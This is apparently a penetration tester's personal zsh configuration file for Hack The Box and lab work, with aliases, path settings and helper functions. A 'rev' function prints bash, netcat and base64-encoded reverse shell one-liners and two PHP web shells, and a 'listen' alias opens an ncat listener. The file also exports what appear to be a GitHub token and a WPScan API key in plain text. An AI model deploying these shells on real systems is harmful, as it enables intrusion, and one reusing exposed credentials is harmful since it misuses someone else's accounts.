# coded by sharpicx 
# original writings
export TOKEN_GH=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
export TERM='xterm-256color'
export HISTFILE=~/.zsh_history
export EDITOR='nvim'
export TERMINAL='kitty'
export BROWSER='google-chrome-stable'
export MANPAGER="bat -l man -p"
export WPSCAN_API=F0y3fug9G1J53tJH5q1QovCO8g7pp7WA0XBB99s7eds
export TESSDATA_PREFIX=/usr/share/tessdata
export HISTFILESIZE=1000000000
export HISTSIZE=1000000000

# wine 
WINEPREFIX=/home/via/.wine

# default path
export PATH=$HOME/bin:/usr/local/bin:$HOME/.local/bin:/bin:/opt/google/chrome:$HOME/.local/share/gem/ruby/3.0.0/bin:/home/via/.cargo/bin:$PATH:/home/via/go/bin:/usr/lib/ruby/gems/3.0.0:/usr/share/run
#/usr/lib/jvm/java-17-openjdk:/usr/lib/jvm/java-17-openjdk/bin:$HOME/random-stuff/pribadi:/var/lib/snapd/snap/bin:/home/via/.cargo/bin:$PATH:/home/via/go/bin:/usr/lib/ruby/gems/3.0.0:/usr/share/run
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk
export _JAVA_AWT_WM_NONREPARENTING=1

# ENVIRONMENT
LOCAL_HOST=$(ip add show wlan0 | tail +3 | head -1 | cut -f6 -d " " | awk '{print substr( $0, 1, length($0)-3)}')
HTB_HOST=$(ip add show tun0 2>&1 | tail +3 | head -1 | cut -f6 -d " " | awk '{print substr( $0, 1, length($0)-3)}') # htb ip address
CUSTOM_HOST=$(ip add show vboxnet0 2>&1 | tail +3 | head -1 | cut -f6 -d " " | awk '{print substr( $0, 1, length($0)-3)}') # biar ga repot aja sih while playing custom virtual machines.
LOGIN=$(nmcli device show wlan0 | grep IP4.GATEWAY | awk -F: '{ print $2 }' | sed -E 's/[[:blank:]]//g')
LPORT=4444

export ZSH="/home/via/.oh-my-zsh"
ZSH_THEME="mira"
ENABLE_CORRECTION="true"
plugins=(git archlinux)
source $ZSH/oh-my-zsh.sh
export LANG=en_US.UTF-8

# custom functions
alias liatin="fzf --preview 'bat --color=always --style=numbers --line-range=:500 {}'"

message() {
  toilet -f mono9 $@
}
vhostw() {
  wfuzz -c -Z -u $1 -H "Host: FUZZ.$1" -w $2 -s 1
}
help() {
  "$1" --help 2>&1 | bat -plhelp
}
cheat() {
  if [ $# -lt 1 ]; then 
    echo '[-] error, a argument is missing.'
  else 
    curl -s "cheat.sh/$1" | bat
  fi
}
cari() {
  find $1 -type f -iname "$2" 2>/dev/null | liatin
}
mulai() {
  if ! tmux ls | cut -d ':' -f1 | grep SHARPICX >/dev/null; then 
    echo "[+] starting..." 
    tmux new-session -t SHARPICX@VIA
  else 
    echo "[+] starting the previous one"
    tmux attach-session
  fi
}
fixit() {
  mv ~/.zsh_history ~/.zsh_history_bad 
  strings -eS ~/.zsh_history_bad > ~/.zsh_history 
  fc -R ~/.zsh_history
  rm ~/.zsh_history_bad
}
myip() {
  res=$(curl -s -X GET 'https://api.ipify.org?format=json' | jq .ip | tr -d '"')
  res2=$(curl -s X GET 'https://api64.ipify.org?format=json' | jq .ip | tr -d '"')
  echo "[+] IPv4: $res"
  echo "[+] IPv6: $res2"
}
diffing() {
  git diff --word-diff-regex=. $1 $2
}
urlenc() {
  case $1 in 
    plus)  python -c "import urllib.parse; string = \"$2\"; print(urllib.parse.quote_plus(string))"  ;;
    normal) python -c "import urllib.parse; string = \"$2\"; print(urllib.parse.quote(string))"    ;;
    *) echo -e "usage: urlencode [normal|plus] string\nby sharpicx"  ;;
  esac
}
urldec() {
  case $1 in 
    normal)
      python -c "import urllib.parse; string = \"$2\"; print(urllib.parse.unquote(string))"
      ;;
    plus)
      python -c "import urllib.parse; string = \"$2\"; print(urllib.parse.unquote_plus(string))"
      ;;
    *)
      echo -e "usage: urldecode [normal|plus] string"
      ;;
  esac
}
smartdec() {
  if [ $# -lt 1 ]; then
    echo -e 'usage: smartdec <string>'
  else
    decrypt=$(python -c "import html; string = \"$1\"; print(html.unescape(string))")
    python -c "import urllib.parse; string = \"$decrypt\"; print(urllib.parse.unquote(string))"
  fi
}
rev() {
  wlan=$(ip add | grep wlan0 | tail +2 | cut -d ' ' -f6 | cut -d '/' -f1)
  tun0=$(ip add | grep tun0 | tail +2 | cut -d ' ' -f6 | cut -d '/' -f1)
  vboxnet0=$(ip add | grep vboxnet0 | tail +2 | cut -d ' ' -f6 | cut -d '/' -f1)
  case $1 in 
  bash)
    echo -ne "[+] vboxnet0: /bin/bash -i >& /dev/tcp/$vboxnet0/4444 0>&1\n"
    echo -ne "[+] tun0: /bin/bash -i >& /dev/tcp/$tun0/4444 0>&1\n"
    echo -ne "[+] wlan0: /bin/bash -i >& /dev/tcp/$wlan/4444 0>&1\n"
    echo "[*] port: 4444"
  ;;
  tun0)
    echo -ne "[+] vboxnet0: /bin/bash -i >& /dev/tcp/$vboxnet0/4444 0>&1\n"
    echo -ne "[+] tun0: /bin/bash -i >& /dev/tcp/$tun0/4444 0>&1\n"
    echo -ne "[+] wlan0: /bin/bash -i >& /dev/tcp/$wlan/4444 0>&1\n"
    echo "[*] port: 4444"
  ;;
  base64) 
    echo -ne "[+] vboxnet0:\n$(echo -n "/bin/bash -i >& /dev/tcp/$vboxnet0/4444 0>&1" | base64)\n" 
    echo -ne "[+] wlan0: \n$(echo -n "/bin/bash -i >& /dev/tcp/$wlan/4444 0>&1" | base64)\n" 
    echo -ne "[+] tun0: /bin/bash -i >& /dev/tcp/$tun0/4444 0>&1\n"
    echo 'port: 4444'
  ;;
  nc)
    echo -ne "[+] vboxnet0: nc -e /bin/bash $vboxnet0 4444\n"
    echo -ne "[+] wlan0: nc -e /bin/bash $wlan 4444\n"
    echo -ne "[+] tun0: /bin/bash -i >& /dev/tcp/$tun0/4444 0>&1\n"
    echo '[*] port: 4444'
  ;;
  get)
    echo '<?php system($_GET["cmd"]); ?>'
  ;;
  post)
    echo '<?php system($_POST["cmd"]); ?>'
  ;;
  *)
    echo 'usage: rev [bash|base64|nc|get|post]'
  ;;
  esac
}
detecthash() {
  hash="$1"
  haiti -e $hash
  hashid -j -m $hash 
}

# general aliases
alias nf="neofetch --color_blocks on"
alias hotkey="kitty +kitten show_key"
alias cat="bat --plain --style=grid"
alias ls="exa --color=always --icons"
alias zshrc="nvim ~/.zshrc"
alias vimrc="nvim ~/.vimrc"
alias nvimrc="vim ~/.config/nvim/init.lua"
alias vpn1="echo 'login sudo first!'; sudo hide.me connect free-unlimited.hideservers.net -t '/etc/hide.me/accessToken.txt'"
alias connect="nmcli device wifi connect LeviFazle"
alias x="exit"
alias c="clear"
alias listen="ncat -nvlp 4444"
alias share="sudo python -m http.server 80 -d $1"
alias cme='crackmapexec'
alias john="/usr/share/run/john"

# youtube-dl
alias dmp3="yt-dlp --extract-audio --audio-format mp3 -o '%(title)s.%(ext)s' -i"

# system
alias upgrade="sudo pacman -Syyu"
alias search="pacman -Ss"
alias infopaket="pacman -Qi"
alias ipaket="sudo pacman -S"
alias aur="yay -S"
alias upaket="sudo pacman -Rncs"

# custom
alias salin="xclip -sel clipboard"

alias reload="tmux -f ~/.tmux.conf"

# translation, because i'm not a native speaker.
alias ento="trans en:id"
alias idto="trans id:en" 

# alias osint-lists=""
# alias ohmyzsh="mate ~/.oh-my-zsh"
#export _JAVA_AWT_WM_NONREPARENTING=1

source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
source ~/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
source ~/.zsh/fzf-tab/fzf-tab.plugin.zsh
source ~/.oh-my-zsh/plugins/fzf/fzf.plugin.zsh

PATH="/home/via/perl5/bin${PATH:+:${PATH}}"; export PATH;
PERL5LIB="/home/via/perl5/lib/perl5${PERL5LIB:+:${PERL5LIB}}"; export PERL5LIB;
PERL_LOCAL_LIB_ROOT="/home/via/perl5${PERL_LOCAL_LIB_ROOT:+:${PERL_LOCAL_LIB_ROOT}}"; export PERL_LOCAL_LIB_ROOT;
PERL_MB_OPT="--install_base \"/home/via/perl5\""; export PERL_MB_OPT;
PERL_MM_OPT="INSTALL_BASE=/home/via/perl5"; export PERL_MM_OPT;
